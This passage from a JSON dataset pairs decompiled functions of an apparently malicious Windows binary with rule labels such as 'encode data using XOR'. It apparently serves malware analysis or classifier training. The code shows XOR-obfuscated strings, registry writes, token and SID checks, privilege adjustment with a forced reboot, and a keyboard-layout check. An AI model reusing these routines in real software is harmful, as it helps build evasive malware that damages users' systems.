0x74341c41;\n    var_49h = 0x51;\n    var_30h = 0x346f4151;\n    var_2ch._0_1_ = 0x74;\n    var_53h._1_1_ = var_90h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc1);\n    var_3ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_3ch;\n        iVar5 = iVar8 % var_34h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_30h + iVar5) ^ puVar1[&var_a8h - var_3ch];\n    } while (iVar8 < 0x60);\n    hKey = fcn.0040e4a3(0xf003f);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n    piVar10 = var_ach;\n    if (hKey != 0) {\n        var_18h = 0x32074537;\n        var_14h = 0x682b740d;\n        var_10h = 0x45747846;\n        var_8h = 0x32684574;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x78);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        lpValueName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        iVar8 = lpValueName;\n        do {\n            puVar1 = iVar5 + iVar8;\n            iVar8 = iVar5 % var_34h;\n            iVar5 = iVar5 + 1;\n            *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_18h - lpValueName];\n            iVar8 = lpValueName;\n        } while (iVar5 < 0xc);\n        var_18h = 0x4f086b22;\n        var_14h = 0x6b1a611e;\n        var_10h = 0x616a4f58;\n        var_8h = 0x4f696b72;\n        var_4h._0_2_ = 0x616a;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        var_34h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        do {\n            puVar1 = iVar8 + var_34h;\n            iVar5 = iVar8 % var_48h;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_18h - var_34h];\n        } while (iVar8 < 0xc);\n        var_1ch = 0x462b3630;\n        var_18h = 0x3617511b;\n        var_14h = 0x51174627;\n        var_10h = 0x467f360d;\n        var_ch._0_2_ = 0x5178;\n        var_8h = 0x464e3663;\n        var_4h._0_2_ = 0x5178;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar10 = var_ach;\n        iVar5 = 0;\n        var_30h = &var_1ch - iVar8;\n        do {\n            puVar1 = iVar5 + iVar8;\n            iVar6 = iVar5 % var_48h;\n            iVar5 = iVar5 + 1;\n            *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_1ch - iVar8];\n        } while (iVar5 < 0x12);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, lpValueName, 0, 4, &Reserved, 4);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        piVar4 = lpData;\n        do {\n            iVar2 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar2 != var_b4h);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, var_34h, 0, 1, lpData, (piVar4 - (lpData + 1) >> 1) * 2);\n        piVar4 = piVar10;\n        do {\n            iVar2 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar2 != var_b4h);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, iVar8, 0, 1, piVar10, (piVar4 - (piVar10 + 1) >> 1) * 2);\n        fcn.0040e667();\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        uVar3 = (*pcVar7)(0, iVar8);\n        pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar7)(0, var_34h);\n        (*pcVar9)(uVar3);\n        uVar3 = (*pcVar7)(0, lpValueName);\n        (*pcVar9)(uVar3);\n    }\n    uVar3 = (*pcVar7)(0, var_3ch);\n    (*pcVar9)(uVar3);\n    uVar3 = (*pcVar7)(0, piVar10);\n    (*pcVar9)(uVar3);\n    return 1;\n}\n",
        "token_count": 2492
    },
    "00407459": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407459(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.0040c58c();\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41caa4, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41cd34);\n    var_28h = 0x7a096735;\n    var_24h = 0x7a025804;\n    var_20h = 0x673d6d02;\n    var_1ch = 0x58437a19;\n    var_18h = 0x6d027a02;\n    var_14h = 0x7a7a673d;\n    var_10h = 0x7a7a6758;\n    var_ch._0_1_ = 0x6d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n    var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    do {\n        var_4h = 5;\n        puVar1 = iVar5 + var_8h;\n        iVar4 = iVar5 % 5;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_10h + iVar4) ^ puVar1[&var_28h - var_8h];\n    } while (iVar5 < 0x18);\n    uVar3 = fcn.00404556(0);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(uVar3);\n    fcn.00407e2c();\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 517
    },
    "00407ff4": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00407ff4(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar7 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    pcVar2 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar4 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar4 == 0x7a) &&\n           (puVar5 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  var_18h = puVar5,  puVar5 != NULL)) {\n            iVar4 = (*pcVar2)(hObject, 1, puVar5, dwBytes, &dwBytes);\n            if ((iVar4 != 0) &&\n               ((iVar4 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar5, &StringSid),  iVar4 != 0 &&\n                (StringSid != 0)))) {\n                var_34h = 0x58796b03;\n                var_30h = 0x54465050;\n                var_2ch = 0x6b7d616d;\n                var_28h = 0x50595865;\n                var_24h._0_2_ = 0x546b;\n                var_20h = 0x58546b50;\n                var_1ch._0_1_ = 0x61;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                do {\n                    var_10h = 5;\n                    puVar1 = iVar7 + iVar4;\n                    iVar6 = iVar7 % 5;\n                    iVar7 = iVar7 + 1;\n                    *puVar1 = *(&var_20h + iVar6) ^ puVar1[&var_34h - iVar4];\n                } while (iVar7 < 0x12);\n                iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(iVar4, StringSid);\n                iVar7 = var_14h;\n                if (iVar6 == 0) {\n                    iVar7 = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                puVar5 = var_18h;\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar5);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar7;\n}\n",
        "token_count": 859
    },
    "00408d9a": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00408d9a(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x41ca90;\n    var_14h = param_1;\n    if (*0x41cd28 == NULL) {\n        var_4ch = 0x60435e15;\n        var_48h = 0x502c147d;\n        var_44h._0_2_ = 0x3a56;\n        var_44h._2_1_ = 0x2c;\n        var_8h = 6;\n        var_44h._3_1_ = 6;\n        var_40h = 0x6202462d;\n        var_3ch = 0x5410220f;\n        var_38h = 0x343b3f50;\n        var_34h = 0x395d4521;\n        var_30h._0_2_ = 0x5127;\n        var_1ch = 0x56343142;\n        var_18h._0_2_ = 0x5149;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        var_ch = &var_4ch - var_10h;\n        do {\n            puVar1 = iVar8 + var_10h;\n            iVar5 = iVar8 % var_8h;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_4ch - var_10h];\n        } while (iVar8 < 0x1e);\n        var_2ch = 0x1f050b2c;\n        var_28h = 0x5c741629;\n        var_24h = 0x16201559;\n        var_20h._0_1_ = 0x47;\n        var_1ch = 0x71776e47;\n        var_18h._0_2_ = 0x7a4c;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = var_10h;\n        iVar7 = 0;\n        do {\n            puVar1 = iVar7 + iVar5;\n            iVar6 = iVar7 % var_8h;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_1ch + iVar6) ^ puVar1[&var_2ch - iVar5];\n        } while (iVar7 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_10h);\n        *0x41cd28 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar8);\n        (*pcVar4)(uVar3);\n        pcVar4 = *0x41cd28;\n        if (*0x41cd28 == NULL) goto code_r0x00408ef7;\n    }\n    iVar8 = var_14h;\n    pcVar4 = (**0x41cd28)(var_14h);\n    if (pcVar4 != '\\0') {\n        *0x41ca90 = iVar8 != 0;\n    }\ncode_r0x00408ef7:\n    return pcVar4 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1114
    },
    "00409352": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409352(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_28h = 0x20345b24;\n    var_24h = 0x631e5617;\n    var_20h = 0x4e103133;\n    var_1ch._0_1_ = 0x72;\n    var_ch = 0x54463272;\n    var_8h._0_2_ = 0x3762;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_4h = 6;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + var_10h;\n        iVar5 = iVar7 % 6;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_ch + iVar5) ^ puVar1[&var_28h - var_10h];\n    } while (iVar7 < 0xd);\n    var_28h = 0x1f050b2c;\n    var_24h = 0x5c741629;\n    var_20h = 0x16201559;\n    var_1ch._0_1_ = 0x47;\n    var_18h = 0x71776e47;\n    var_14h._0_2_ = 0x7a4c;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = var_10h;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + iVar5;\n        iVar6 = iVar8 % var_4h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_18h + iVar6) ^ puVar1[&var_28h - iVar5];\n    } while (iVar8 < 0xd);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_10h);\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar7);\n    (*pcVar2)(uVar4);\n    return;\n}\n",
        "token_count": 745
    },
    "00409450": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00409450(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint nNumberOfBytesToWrite;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    int32_t hHeap;\n    \n    iVar5 = 8;\n    lpString2 = param_1;\n    var_10h = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_10h * 2 + 0x1a);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (iVar3 != 0) {\n            var_8h = iVar3;\n            uVar2 = (*pcVar6)(8, var_10h * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar3, lpString2);\n                var_18h = fcn.0040e804();\n                var_18h = var_18h + 2;\n                var_34h = 0x6c07395c;\n                var_30h = 0x6b17793a;\n                var_2ch = 0x39184f0e;\n                var_28h = 0x794f6c1f;\n                var_24h = 0x6c6b3979;\n                var_20h._0_1_ = 0x4f;\n                uVar2 = (*pcVar6)(8, 0x21);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                var_10h = 5;\n                var_1ch = iVar3;\n                iVar5 = 0;\n                do {\n                    puVar1 = iVar5 + iVar3;\n                    iVar4 = iVar5 % 5;\n                    iVar5 = iVar5 + 1;\n                    *puVar1 = *(&var_24h + iVar4) ^ puVar1[&var_34h - iVar3];\n                } while (iVar5 < 0x10);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar6 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_18h, iVar3, uVar2);\n                (*pcVar6)(hHeap, L\"\\\"%s\\\"\", lpString2);\n                pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar5 = 8;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                if (lpString2 != 0) {\n                    var_14h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_80h = 0x7393931;\n                    var_7ch = 0x606d3200;\n                    var_78h = 0x3e7d4907;\n                    var_74h = 0x7001586d;\n                    var_70h = 0x64446868;\n                    var_6ch = 0x68775a;\n                    var_68h = 0x28295a64;\n                    var_64h = 0x68754919;\n                    var_60h = 0x3963787c;\n                    var_5ch = 0x11106d2b;\n                    var_58h = 0x55393e39;\n                    var_54h = 0x6d7c754c;\n                    var_50h = 0x22240612;\n                    var_4ch = 0x5d1c506d;\n                    var_48h._0_2_ = 0x2947;\n                    var_48h._2_1_ = 0x10;\n                    var_48h._3_1_ = 5;\n                    var_44h = 0x45686870;\n                    var_40h._0_2_ = 0x5a64;\n                    var_40h._2_1_ = 0x4d;\n                    var_24h = 0x754d4d50;\n                    var_20h._0_1_ = 0x69;\n                    uVar2 = (*pcVar6)(8, 0x44);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar5 = 0;\n                    do {\n                        puVar1 = iVar5 + iVar4;\n                        iVar3 = iVar5 % var_10h;\n                        iVar5 = iVar5 + 1;\n                        *puVar1 = *(&var_24h + iVar3) ^ puVar1[&var_80h - iVar4];\n                    } while (iVar5 < 0x43);\n                    uVar2 = var_14h;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar4, var_14h, var_14h);\n                    iVar5 = fcn.0040d77b(nNumberOfBytesToWrite);\n                    iVar3 = var_1ch;\n                    if (iVar5 == 0) {\n                        iVar5 = fcn.004096d2(uVar2);\n                    }\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                uVar2 = (*pcVar6)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar6)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                iVar3 = var_8h;\n            }\n            uVar2 = (*pcVar6)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 1700
    },
    "004098f3": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004098f3(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_3eh;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uchar var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    int32_t lpLibFileName;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_68h = 0xf01faf00;\n    var_64h = 0x505600;\n    var_60h = 0x8002700;\n    var_5ch = 0xc2900;\n    var_58h = 0x56900;\n    var_54h = 0x3ff00;\n    var_50h = 0x1c4200;\n    var_4ch = 0x163e00;\n    var_18h = 0;\n    var_30h = 0x3c0a343f;\n    var_2ch = 0x434724;\n    var_28h = var_28h & 0xff000000 | 0x700225;\n    var_20h = 0x6e49646d;\n    var_1ch._0_2_ = 0x7370;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_4h = 0;\n    var_10h = &var_30h - lpLibFileName;\n    do {\n        var_ch = 6;\n        iVar9 = var_4h + 1;\n        *(var_4h + lpLibFileName) = *(&var_20h + var_4h % 6) ^ (var_4h + lpLibFileName)[&var_30h - lpLibFileName];\n        var_4h = iVar9;\n    } while (iVar9 < 0xb);\n    var_38h = 0x31332462;\n    var_34h = 0x3b344522;\n    var_30h = 0x34640421;\n    var_2ch = 0x5904202b;\n    var_28h = 0xd343325;\n    var_24h = 0x37;\n    var_ch = 0x555a5137;\n    var_8h._0_1_ = 0x61;\n    uVar5 = (*pcVar7)(8, 0x16);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar9 = lpLibFileName;\n    iVar11 = 0;\n    do {\n        var_10h = 5;\n        puVar1 = iVar11 + iVar6;\n        iVar10 = iVar11 % 5;\n        iVar11 = iVar11 + 1;\n        *puVar1 = *(&var_ch + iVar10) ^ puVar1[&var_38h - iVar6];\n    } while (iVar11 < 0x15);\n    uVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n    uVar12 = var_18h;\n    if (pcVar7 == NULL) {\n        uVar12 = 0;\n    }\n    else {\n        (*pcVar7)(&var_48h);\n        uVar4 = var_3eh;\n        uVar3 = var_3eh & 0xffffff;\n        var_3eh = uVar3 | uVar12 << 0x18;\n        uVar8 = 0;\n        uVar2 = uVar12 & 0xff;\n        do {\n            if ((uVar2 | (uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8 | uVar3 << 0x18) == (&var_68h)[uVar8]) {\n                uVar12 = 1;\n            }\n            uVar8 = uVar8 + 1;\n        } while (uVar8 < 8);\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n    (*pcVar7)(uVar5);\n    return uVar12;\n}\n",
        "token_count": 1243
    },
    "0040a800": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a800(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_24h = 0x31332462;\n    var_20h = 0x3b344522;\n    var_1ch = 0x34640421;\n    var_18h = 0x5904202b;\n    var_14h = 0xd343325;\n    var_10h._0_1_ = 0x37;\n    var_ch = 0x555a5137;\n    var_8h._0_1_ = 0x61;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        var_4h = 5;\n        puVar1 = iVar6 + iVar4;\n        iVar5 = iVar6 % 5;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_ch + iVar5) ^ puVar1[&var_24h - iVar4];\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    } while (iVar6 < 0x15);\n    while (iVar6 = (*pcVar2)(0, iVar4),  iVar6 == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 470
    },
    "0040ae61": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ae61(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint NewState;\n    uint lpLuid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    uint var_4h;\n    \n    var_34h = 0x26350615;\n    var_30h = 0x9073233;\n    var_2ch = 0x11162839;\n    var_28h = 0x2a2f380f;\n    var_24h = 0x462b0106;\n    var_10h = 0x4e666346;\n    var_ch._0_1_ = 0x46;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        var_4h = 5;\n        puVar1 = iVar6 + iVar4;\n        iVar5 = iVar6 % 5;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_10h + iVar5) ^ puVar1[&var_34h - iVar4];\n    } while (iVar6 < 0x14);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar4, &lpLuid);\n    NewState = 1;\n    var_14h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar2 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar6 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    if (iVar6 == 0) {\n        (*pcVar2)(4, 0);\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 600
    },
    "0040bdeb": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.0040bdeb(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uchar *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    uint var_48h;\n    uint var_44h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uchar *var_13h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_48h = 0x612d421b;\n    var_4h = 0x5;\n    var_44h._0_1_ = 5;\n    stack0xffffffb9 = 0x44f267a;\n    var_3fh = 0x28421c66;\n    var_3bh = 0x2b7a0e61;\n    var_37h = 0x11660b4f;\n    var_33h = 0xb612342;\n    var_2fh = 0xe4f2c7a;\n    var_2bh = 0x3e420a66;\n    var_27h = 0x317a1461;\n    var_23h = 0xf66154f;\n    var_1fh = 0x11613942;\n    var_1bh = 0x184f3a7a;\n    var_17h = 0x4f420066;\n    var_13h._0_1_ = 0x61;\n    stack0xffffffec 